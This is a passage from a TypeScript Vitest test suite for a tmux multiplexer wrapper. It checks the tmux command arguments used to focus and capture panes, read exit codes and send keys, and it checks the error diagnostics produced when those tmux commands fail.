    const { TmuxMultiplexer } = await importFresh<
      typeof import("../src/multiplexer-tmux")
    >("../src/multiplexer-tmux");

    await new TmuxMultiplexer().focusPane({
      paneId: "%42",
      windowName: "reviewer",
      session: "pi-subagent-abc123",
    });

    expect(calls).toEqual([
      ["select-window", "-t", "%42", ";", "select-pane", "-t", "%42"],
    ]);
    // An ambiguous bare window name must never be the target.
    expect(calls[0]).not.toContain("reviewer");
  });

  it("focusPane selects a split pane by pane id", async () => {
    const calls: string[][] = [];
    vi.resetModules();
    vi.doMock("node:child_process", () => ({
      execFile: (
        _file: string,
        args: string[],
        _options: object,
        callback: (error: Error | null, stdout: string) => void,
      ) => {
        calls.push(args);
        callback(null, "");
      },
      execFileSync: () => "",
    }));
    const { TmuxMultiplexer } = await importFresh<
      typeof import("../src/multiplexer-tmux")
    >("../src/multiplexer-tmux");

    await new TmuxMultiplexer().focusPane({ paneId: "%42" });

    // select-window is required even for a split: select-pane alone does not
    // change the active window (verified against tmux 3.7b).
    expect(calls).toEqual([
      ["select-window", "-t", "%42", ";", "select-pane", "-t", "%42"],
    ]);
  });

  it("capturePane uses tmux capture-pane and bounds output by lines and bytes", async () => {
    const calls: string[][] = [];
    vi.resetModules();
    vi.doMock("node:child_process", () => ({
      execFile: (
        _file: string,
        args: string[],
        _options: object,
        callback: (error: Error | null, stdout: string) => void,
      ) => {
        calls.push(args);
        callback(null, "one\ntwo\nthree\nfour");
      },
      execFileSync: () => "",
    }));
    const { TmuxMultiplexer } = await importFresh<
      typeof import("../src/multiplexer-tmux")
    >("../src/multiplexer-tmux");

    const result = await new TmuxMultiplexer().capturePane(
      { paneId: "%42" },
      { maxLines: 2, maxBytes: 7 },
    );

    expect(calls[0]).toEqual(["capture-pane", "-p", "-t", "%42", "-S", "-2"]);
    expect(result).toEqual({ output: "ee\nfour", truncated: true });
  });

  /* ------------------------------------------------------------------ */
  /*  readPaneExitCode — command contract (subset; detailed tests in     */
  /*  interactive-tmux.test.ts cover return values)                      */
  /* ------------------------------------------------------------------ */

  it("readPaneExitCode uses show-options -p -v -t paneId @pi-exit-code", async () => {
    process.env.TMUX = "/tmp/tmux-1000/default,12345,0";
    const calls: string[][] = [];
    installMockExec((args) => {
      calls.push(args);
      if (args[0] === "show-options") return "0\n";
      return "";
    });
    const { readPaneExitCode } = await importFresh<
      typeof import("../src/multiplexer-tmux")
    >("../src/multiplexer-tmux");
    readPaneExitCode("%42");

    const so = calls.find((a) => a[0] === "show-options");
    expect(so).toBeDefined();
    expect(so).toContain("-p"); // pane-scoped
    expect(so).toContain("-v"); // value only (no name)
    expect(so).toContain("-t");
    expect(so).toContain("%42");
    expect(so).toContain("@pi-exit-code");
  });

  it("readPaneExitCode suppresses stderr to avoid leaking 'invalid option' into parent TUI", async () => {
    process.env.TMUX = "/tmp/tmux-1000/default,12345,0";
    const capturedOptions: Array<Record<string, unknown> | undefined> = [];
    vi.resetModules();
    vi.doMock("node:child_process", () => ({
      execFileSync: (_file: string, args: string[], options?: unknown) => {
        capturedOptions.push(options as Record<string, unknown> | undefined);
        if (args[0] === "show-options") throw new Error("unset");
        return "";
      },
    }));
    const { readPaneExitCode } = await importFresh<
      typeof import("../src/multiplexer-tmux")
    >("../src/multiplexer-tmux");
    expect(readPaneExitCode("%42")).toBeNull();

    const opts = capturedOptions.find(
      (o) => o && Array.isArray((o as any).stdio),
    );
    expect(opts).toBeDefined();
    const stdio = (opts as any).stdio as [string, string, string];
    expect(stdio[2]).toBe("ignore");
  });
});

/* ------------------------------------------------------------------ */
/*  improved diagnostics on command failure                           */
/* ------------------------------------------------------------------ */

it("buildAttachCommands throws improved diagnostic on display-message failure", async () => {
  process.env.TMUX = "/tmp/tmux-1000/default,12345,0";
  vi.resetModules();
  vi.doMock("node:child_process", () => ({
    execFileSync: (_file: string, args: string[]) => {
      if (args[0] === "display-message") {
        const err = new Error("Command failed") as Error & {
          stderr?: Buffer;
          status?: number;
        };
        err.stderr = Buffer.from("can't find pane: %99");
        err.status = 1;
        throw err;
      }
      return "";
    },
  }));
  const { TmuxMultiplexer } = await importFresh<
    typeof import("../src/multiplexer-tmux")
  >("../src/multiplexer-tmux");
  expect(() =>
    new TmuxMultiplexer().buildAttachCommands({ paneId: "%99" }),
  ).toThrow(
    /\[tmux\] display-message failed.*exit code 1.*stderr: can't find pane/,
  );
});

it("createPane background throws improved diagnostic on new-window failure", async () => {
  process.env.TMUX = "/tmp/tmux-1000/default,12345,0";
  vi.resetModules();
  vi.doMock("node:child_process", () => ({
    execFileSync: (_file: string, args: string[]) => {
      if (isCommandProbe(args)) return ""; // commandExists succeeds
      if (args[0] === "new-window") {
        const err = new Error("Command failed") as Error & {
          stderr?: Buffer;
          status?: number;
        };
        err.stderr = Buffer.from("no such session");
        err.status = 1;
        throw err;
      }
      return "";
    },
  }));
  const { TmuxMultiplexer } = await importFresh<
    typeof import("../src/multiplexer-tmux")
  >("../src/multiplexer-tmux");
  expect(() =>
    new TmuxMultiplexer().createPane({
      name: "Test",
      cwd: "/tmp",
      background: true,
    }),
  ).toThrow(/\[tmux\] new-window failed.*exit code 1.*stderr: no such session/);
});

it("sendKeys throws improved diagnostic on send-keys failure", async () => {
  process.env.TMUX = "/tmp/tmux-1000/default,12345,0";
  vi.resetModules();
  vi.doMock("node:child_process", () => ({
    execFileSync: (_file: string, args: string[]) => {
      if (args[0] === "send-keys" && args.includes("-l")) {
        const err = new Error("Command failed") as Error & {
          stderr?: Buffer;
          status?: number;
        };
        err.stderr = Buffer.from("can't find pane: %99");
        err.status = 1;
        throw err;
      }
      return "";
    },
  }));
  const { TmuxMultiplexer } = await importFresh<
    typeof import("../src/multiplexer-tmux")
  >("../src/multiplexer-tmux");
  expect(() => new TmuxMultiplexer().sendKeys("%99", "echo hi")).toThrow(
    /\[tmux\] send-keys failed.*exit code 1.*stderr: can't find pane/,
  );
});

it("sendEnter throws improved diagnostic on send-keys Enter failure", async () => {
  process.env.TMUX = "/tmp/tmux-1000/default,12345,0";
  vi.resetModules();
  vi.doMock("node:child_process", () => ({
    execFileSync: (_file: string, args: string[]) => {
      if (args[0] === "send-keys" && args.includes("Enter")) {
        const err = new Error("Command failed") as Error & {
          stderr?: Buffer;
          status?: number;
        };
        err.stderr = Buffer.from("no such pane: %99");
        err.status = 1;
        throw err;
      }
      return "";
    },
  }));
  const { TmuxMultiplexer } = await importFresh<
    typeof import("../src/multiplexer-tmux")
  >("../src/multiplexer-tmux");
  expect(() => new TmuxMultiplexer().sendEnter("%99")).toThrow(
    /\[tmux\] send-keys Enter failed.*exit code 1.*stderr: no such pane/,
  );
});
